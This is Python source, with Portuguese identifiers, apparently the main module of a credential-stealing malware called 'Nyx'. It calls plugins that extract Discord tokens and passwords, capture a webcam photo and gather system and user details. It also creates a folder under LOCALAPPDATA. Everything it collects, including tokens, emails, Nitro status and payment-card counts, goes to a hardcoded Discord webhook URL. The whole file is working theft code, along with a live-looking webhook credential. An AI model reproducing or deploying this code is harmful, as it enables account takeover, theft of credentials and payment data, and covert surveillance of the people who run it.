import subprocess
import requests
import os
from plugins.systeminfo import obter_informacoes_sistema
from plugins.discordtoken import TokenExtractor
from plugins.webcam import capture_photo
from plugins.userinfo import UserInfos
from plugins.operationsystem import get_os_info
from plugins.password import PasswordExtractor
from datetime import datetime


DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
webhook_username = "Nyxbot"

appdata_local = os.getenv('LOCALAPPDATA')
pasta_nyx = os.path.join(appdata_local, 'Nyx')
if not os.path.exists(pasta_nyx):
    os.makedirs(pasta_nyx)


def executar_comando(comando):
    try:
        resultado = subprocess.check_output(comando, shell=True, text=True)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar o comando: {e}"

def enviar_para_discord(mensagem, embed=None):
    payload = {
        'username': webhook_username,
        'avatar_url': webhook_avatar
    }
    
    if embed:
        payload['embeds'] = [embed]
    else:
        payload['content'] = mensagem

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

if __name__ == "__main__":
    try:
        informacoes_sistema = obter_informacoes_sistema()
        discord_info = TokenExtractor()
        discord_info.extract_tokens()
        webcam_foto = capture_photo()
        user_info_instance = UserInfos()
        user_info = user_info_instance.get_user_info()
        os_info = get_os_info()  

        user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
        
        user_info_embed = {
            'title': 'Informações do Usuário',
            'description': f'```\n{user_info_message}\n```',
            'color': 0x0000FF  
        }
        enviar_para_discord('', embed=user_info_embed)

        sistema_embed = {
            'title': 'Informações do Sistema',
            'description': f'```\n{informacoes_sistema}\n```',
            'color': 0x00FF00  
        }
        enviar_para_discord('', embed=sistema_embed)
        
        os_embed = {
            'title': 'Informações de SO',
            'description': f'```\n{os_info}\n```',
            'color': 0x00FF00
        }
        enviar_para_discord('', embed=os_embed)

        from datetime import datetime

        for token in discord_info.tokens:
            user_data = discord_info.get_user_data(token)
            if user_data:
                # Montar a URL da foto de perfil
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                
                discord_embed = {
                    'title': 'Informações do Discord',
                    'description': f"Nome de usuário: {user_data['username']}\n"
                                f"E-mail: {user_data.get('email', 'Não disponível')}\n"
                                f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
                                f"Token: `{token}`",
                    'color': 0xFF0000,  
                    'thumbnail': {
                        'url': avatar_url  # Adiciona a URL da foto de perfil como thumbnail
                    }
                }

                payment_sources = discord_info.get_payment_sources(token)
                if payment_sources:
                    discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
                else:
                    discord_embed['description'] += "\nNenhum cartão de crédito registrado"

                subscriptions = discord_info.get_nitro_subscription(token)
                if subscriptions:
                    for sub in subscriptions:
                        renew_timestamp = sub.get("current_period_end")
                        if renew_timestamp:
                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
                            discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
                        else:
                            discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"

                enviar_para_discord('', embed=discord_embed)


    except Exception as e:
        print(f"Erro geral: {e}")
